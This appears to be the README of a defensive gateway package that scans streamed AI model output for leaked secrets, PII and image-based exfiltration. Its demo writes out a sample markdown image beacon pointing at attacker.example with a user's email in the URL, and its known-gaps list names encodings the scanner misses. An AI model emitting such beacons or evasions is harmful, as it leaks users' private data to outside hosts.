# aegis_stream: the gateway's streaming response path

`aegis_stream` is a stdlib-only Python 3.13 package that sits between an upstream model stream and the client. It handles three wire formats:

* **Anthropic Messages SSE**
* **OpenAI chat-completions SSE**
* **Ollama NDJSON** (`/api/chat` and `/api/generate`)

For every stream it does the following:

1. **Rehydrates vault placeholders for the local user.** `[EMAIL_1]` and `[PL_PESEL_2]` become the real values. This works when a placeholder is split across deltas, and inside tool-call JSON, where the value is JSON-escaped and only substituted inside string literals.
2. **Scans the model output for leaks** with a sliding window and a hold-back buffer. It looks for:
   * secrets (AWS, Anthropic, OpenAI, GitHub, Slack, Google, Stripe, JWT, PEM)
   * PII (PAN with Luhn check, PESEL, IBAN, email)
   * markdown or HTML image exfiltration beacons
   * canary values

   Each finding has an action: **alert**, **mask** or **block**. A block ends the stream early with **protocol-valid closing events**, so Claude Code and the SDKs end the turn instead of retrying.
3. **Extracts usage** for the budget ledger: exact counts where the upstream sends them, a running estimate otherwise, and compute-seconds for local models. It also enforces output caps mid-stream.

The core is **sans-IO**: `feed(bytes) -> bytes`. A small async adapter plugs it into FastAPI's `StreamingResponse`.

```
aegis_stream/
  sse.py          incremental SSE + NDJSON parsers/serialisers (raw bytes kept for byte-exact passthrough)
  placeholders.py placeholder regexes, Vault protocol, MappingVault, batch rehydration
  jsonlex.py      incremental JSON lexer: "inside a string?" + auto-close a truncated document
  detectors.py    leak detectors (find + "hold" regex for incomplete tails)
  scanner.py      LeakScanner: detectors + policy (alert/mask/block) + audit-safe Finding (HMAC fp)
  channel.py      TextChannel: hold-back -> scan -> mask/block -> rehydrate (text or JSON mode)
  base.py         StreamOptions, StreamReport, Termination, StreamTransformer (fail-closed, timing)
  anthropic.py    AnthropicStreamTransformer
  openai.py       OpenAIChatStreamTransformer, prepare_openai_request()
  ollama.py       OllamaStreamTransformer
  aio.py          stream_transform() async adapter, StreamController (kill switch)
tests/            131 tests incl. Hypothesis properties; data/ holds recorded-style fixtures
bench.py          micro-benchmark (per-chunk overhead)
demo/             fake upstream + demo gateway + curl script
```

## Run it

```bash
cd aegis/staging/spikes/streaming
uv run --python 3.13 --with pytest --with hypothesis --with pytest-asyncio pytest -q   # 131 passed, ~4 s
HYPOTHESIS_EXAMPLES=3000 uv run ... pytest -q -k property                              # stress run (~1 min)
uv run --python 3.13 python bench.py                                                   # overhead table
./demo/run_demo.sh                                                                     # curl demo (ports 8798/8799)
```

The package has no runtime dependencies. The tests need `pytest`, `hypothesis` and `pytest-asyncio`. The demo needs `fastapi`, `uvicorn` and `httpx`, which are already in the gateway stack.

## Gateway integration (FastAPI + httpx)

```python
from aegis_stream import (AnthropicStreamTransformer, OpenAIChatStreamTransformer, OllamaStreamTransformer,
                          LeakScanner, StreamOptions, StreamController, stream_transform, prepare_openai_request)

# once per policy version (hot reload swaps it atomically); stateless, shareable across streams
SCANNER = LeakScanner.default(
    allowed_image_hosts=["cdn.bank.example"],      # images elsewhere = exfil
    canaries=policy.canary_tokens,                 # exact strings that must never leave
    actions={"SECRET": "block", "EXFIL": "block", "PCI": "mask", "PII": "mask", "EMAIL": "alert"},
    fingerprint_key=HMAC_KEY,                      # findings carry hmac:… not values
    control="OUT-LEAK",
)

@app.post("/v1/messages")
async def messages(request: Request):
    session = session_key(request)                 # x-claude-code-session-id | X-Aegis-Session | …
    body = dlp.redact_request(await request.json(), vault=vaults[session])   # request side, not in this package
    up = await http.send(http.build_request("POST", url, json=body,
                         headers={**forwarded_headers(request), "accept-encoding": "identity"}), stream=True)
    if up.status_code != 200 or "text/event-stream" not in up.headers.get("content-type", ""):
        data = await up.aread(); await up.aclose()
        return Response(data, status_code=up.status_code, headers=passthrough_headers(up))  # errors unmodified

    tr = AnthropicStreamTransformer(StreamOptions(
        vault=vaults[session],                     # None => no rehydration (e.g. response goes to a T2 hop)
        scanner=SCANNER,                           # None => no output scanning (e.g. T0 local model)
        rehydrate_tool_input=tools_are_local,      # T0 tools (Claude Code Edit/Write/Bash) => True
        output_token_cap=budget.remaining_output_tokens(session),
        on_finding=audit.emit_finding,             # live dashboard feed
    ))
    ctl = StreamController(); kill_switch.register(session, ctl)        # ctl.abort("…") from anywhere
    return StreamingResponse(
        stream_transform(up.aiter_bytes(), tr, controller=ctl, aclose=up.aclose,
                         on_complete=ledger.settle),                    # always runs, even on disconnect
        media_type=tr.media_type,
        headers={"cache-control": "no-cache", "x-accel-buffering": "no"},
    )
```

The OpenAI and Ollama routes work the same way:

```python
body, client_wants_usage = prepare_openai_request(body)   # forces stream_options.include_usage
tr = OpenAIChatStreamTransformer(opts, client_requested_usage=client_wants_usage)  # hides the injected usage chunk
tr = OllamaStreamTransformer(opts)                        # media_type "application/x-ndjson"
tr = transformer_for("anthropic" | "openai" | "ollama", opts)
```

`stream_transform()` takes care of the rest:

* **Keep-alives.** It emits a `ping` (Anthropic) or a `: keep-alive` comment (OpenAI) when the upstream is silent for `keepalive_interval` (default 15 s).
* **Early close.** It stops reading and closes the upstream as soon as the client stream is finished (a block, a budget cap or an abort), so you stop paying for tokens nobody reads.
* **Upstream failures.** A mid-stream upstream exception becomes a protocol-level error event, so the client retries a genuine failure.
* **Client disconnects.** It sets `report.client_disconnected` and still calls `on_complete`.

### `StreamOptions`

| field | default | meaning |
|---|---|---|
| `vault` | `None` | Any object with `resolve("[TYPE_ID]") -> str \| None`. Keys arrive canonical and upper-case. Only placeholders this session issued are restored. |
| `scanner` | `None` | A `LeakScanner`. Scanning runs **before** rehydration, so restored vault values never count as leaks. |
| `rehydrate_text` / `rehydrate_tool_input` | `True` / `True` | Set the tool flag to `False` when tool calls go to remote (T2) tools. Placeholders then stay in place (research 07 §8.5). |
| `tool_input_mode` | `"buffer"` | **buffer**: each tool call is held until it is complete, then scanned and rehydrated as a whole. A blocked tool call is never shown to the client. **stream**: arguments are forwarded incrementally through a JSON-aware hold-back. On termination the JSON is auto-closed. |
| `max_holdback` | `512` | Upper bound on held characters. An image construct longer than this is neutralised or blocked. |
| `output_token_cap` | `None` | Graceful stop (`control=BUDGET`) when the estimated output exceeds this many tokens. |
| `budget_guard` | `None` | `fn(Usage) -> reason \| None`, called after every output delta. Use it for live ledger checks. |
| `notice_template` | `"\n\n[aegis] Response stopped by policy {control}: {reason}"` | Text appended for the user on termination. It never includes the leaked value. |
| `on_truncated_upstream` | `"error"` | For an upstream EOF with no proper end: `error` emits a protocol error event (the client retries), `close` ends gracefully, `passthrough` just ends. |
| `on_finding` | `None` | Audit hook. Exceptions it raises are swallowed and logged. |
| `fail_closed` | `True` | An internal exception becomes a graceful termination (`control=AEGIS-FAILSAFE`). Output is never passed through unscanned. |

### `StreamReport` (`transformer.report`, also passed to `on_complete`)

* `usage`: a `Usage` with these fields:
  * `input_tokens`, `output_tokens`, `cache_read_input_tokens`, `cache_creation_input_tokens`, `reasoning_tokens`;
  * Ollama `*_duration_ns` and `compute_seconds`;
  * `output_chars` and `estimated_output_tokens`;
  * `exact`, which is True once the upstream has reported final counts.
* `findings`: a list of `Finding`. Each has `type`, `category`, `action`, `channel`, `offset`, `length`, a masked `preview`, an HMAC `fingerprint` and `partial`.
* `rehydrated`: counts split as `{"text": n, "tool_input": m}`. Log a tool-input rehydration as its own audit event; this is the A15 re-identification check.
* `termination`: `reason`, `control` and `finding`.
* Status flags: `upstream_complete`, `upstream_truncated`, `upstream_error` and `client_disconnected`.
* Throughput: `chunks_in`, `bytes_in` and `bytes_out`.
* Timing: `cpu_ns` and `overhead_us_per_chunk`. Send these to the performance telemetry panel.

## What the client sees on early termination

| protocol | closing sequence |
|---|---|
| Anthropic | Every open block is closed. A stream-mode `tool_use` first gets an `input_json_delta` that auto-closes its JSON. The notice is appended to the open text block; if none is open, a new text block is created at the next index. Then `message_delta{stop_reason:"end_turn", usage.output_tokens}` and `message_stop`. If no `message_start` was sent yet, one is synthesised. Block indices always stay contiguous. |
| OpenAI | For every unfinished choice: a notice chunk, then a chunk with `finish_reason:"content_filter"`. Then the usage chunk (only if the client asked for usage), then `data: [DONE]`. |
| Ollama | A notice line, then `{"done":true,"done_reason":"stop","eval_count":…}`. |

Upstream `error` events and chunks are forwarded **unmodified**, because clients key their retries off them. Thinking content is forwarded **byte-for-byte**: `thinking`, `redacted_thinking`, `signature_delta`, OpenAI `reasoning_content` and Ollama `thinking`. That includes the placeholders inside it, so signatures stay valid. Other blocks (`server_tool_use`, citations, unknown future events), comments and pings are passed through untouched.

## Design notes and invariants

* **Hold-back, not buffering.** Each content block or tool call has its own `TextChannel`. It holds back only the shortest tail that could still turn into a match:
  * a partial placeholder `[EMA`;
  * a digit run;
  * a partial word or token;
  * an open `![alt](http…` or `<img`.

  In prose that is about one partial word. Every detector declares a `hold` regex (anchored with `\Z`, possessive and with a lookbehind guard, so each delta costs O(tail)). There is also a straddle rule: if a *complete* match crosses the cut, the cut moves back to the start of that match.
* **Streaming equals one-shot.** For any chunking, the output and findings of the streaming path equal those of one-shot processing of the full text. Hypothesis property tests check this over random texts and random chunk boundaries, with rehydration, masking and blocking. In JSON mode the check is exact value-level equality after rehydration, plus validity under masking. These property tests found two real detector bugs, both now fixed:
  * greedy IBAN and PAN regexes swallowed the next value;
  * a PAN followed by a CVV was missed.
* **The image never renders.** The `![…](url` construct is held until its closing `)`. A blocked or masked image therefore never reaches the client in a renderable form. If the URL is longer than `max_holdback`, its opener is neutralised (`![` becomes `[`, `<img` becomes `&lt;img`) or the stream is blocked.
* **Safe tool termination.** In buffer mode a tool call is only emitted once it has been scanned whole. A leak inside it drops the block entirely, and the notice takes its index. Ordering is preserved by an output queue with slots, and termination reasons from what has actually been released to the client.
* **Audit safety.** Findings never contain raw values: the preview is masked (`•••• 1111`, `j•••@b•••.pl`, `AKIA…(20)`, the image host) and the fingerprint is a keyed HMAC. The user-facing notice names only the finding type.

## Plugging in the real DLP detectors

A detector is any object with three members:

* `name`
* `hold`: a regex source string or tuple, ending in `\Z`, that matches any *incomplete* prefix of a match at the end of the text
* `find(text, pos) -> Iterator[Match]`

It may also define two optional methods:

* `hold_start(text)`, for non-regex hold rules
* `on_overlong(text, start)`

Wrap the request-side Tier-D engine like this:

```python
class TierD(Detector):
    name, hold = "tier-d", (DIGIT_HOLD, WORD_HOLD)
    def find(self, text, pos):
        for span in engine.detect(text[pos:]):          # offsets relative to pos
            yield Match(pos + span.start, pos + span.end, span.type, span.data_class, self.name, span.value)
scanner = LeakScanner([TierD(), MarkdownImageDetector(allowed), KnownValueDetector(canaries)], actions=…)
```

`KnownValueDetector(vault.values(), type="VAULT_VALUE")` is also worth adding. If a *real* vault value shows up in the raw upstream output, it reached the remote side through some other path.

## Performance

These numbers come from `bench.py` on an M-series Mac with Python 3.13. The setup is worst case: one SSE event per network chunk, with LLM-like 1–2-word deltas and a placeholder split every ~40 deltas.

| pipeline | mean µs/chunk | p99 µs |
|---|---:|---:|
| SSE parse + `json.loads` only (baseline) | 3.1 | 7.8 |
| Anthropic passthrough | 4.1 | 10.6 |
| Anthropic rehydrate | 4.5 | 9.6 |
| **Anthropic rehydrate + leak scan** | **10.0** | 24.9 |
| OpenAI rehydrate + leak scan | 14.1 | 30.4 |
| Ollama rehydrate + leak scan | 8.8 | 14.6 |

At the channel level, rehydration costs 0.38 µs per delta and rehydration plus scanning 3.7 µs per delta. The research 07 budget is under 100 µs per chunk, and `tests/test_perf.py` guards it. The demo gateway prints higher per-chunk figures because it is cold and handles only 8–33 chunks per request.

## Demo

`./demo/run_demo.sh` starts `demo/fake_upstream.py` on port 8798 and `demo/gateway.py` on port 8799. Both bind to 127.0.0.1. The script then runs the scenarios below with curl and stops both servers when it exits.

1. The raw upstream stream contains only placeholders; the fake upstream logs the redacted prompt it received. The same request through aegis comes back rehydrated in text and in the `send_email` tool input, with the thinking block untouched.
2. The model leaks `AKIA…` mid-stream. The stream ends with the notice, then `content_block_stop`, `message_delta(end_turn)` and `message_stop`.
3. A markdown image beacon (`![status](https://attacker.example/pixel.png?d=[EMAIL_1]…)`) is blocked before it can render.

The gateway prints one `[aegis] {…}` report line per request: findings, termination, usage and overhead.

## Known gaps / next steps

* Placeholders written as `\uXXXX` escapes inside tool JSON are not recognised. Models do not emit them in practice, and the property test checks only validity for `ensure_ascii` input.
* Leaks hidden in base64, hex or URL encoding inside the output are not decoded. Request-side DLP does decode-and-rescan; the output side only checks literal text. Reference-style markdown images (`![x][ref]`) and spelled-out digits are also not detected.
* A thinking block that is open when the stream is terminated is closed without a `signature_delta`. A client that resends it may get a signature error, so verify how Claude Code handles this. The only triggers are budget caps and aborts, because leak scanning never runs on thinking.
* There is no `tool_use` veto hook (a policy that sees the complete tool call before the client does). Buffer mode is the natural place to add one, as a synchronous callback on the complete input. Claude Code tool calls are already governed by the PreToolUse hook.
* The OpenAI `/v1/responses` streaming API and the Anthropic `citations_delta` text are not rehydrated. Both are passed through.
* Hooks (`budget_guard`, `on_finding`) are synchronous. Do async work, such as semantic judges, beside the stream and use `StreamController.abort()` to stop it.
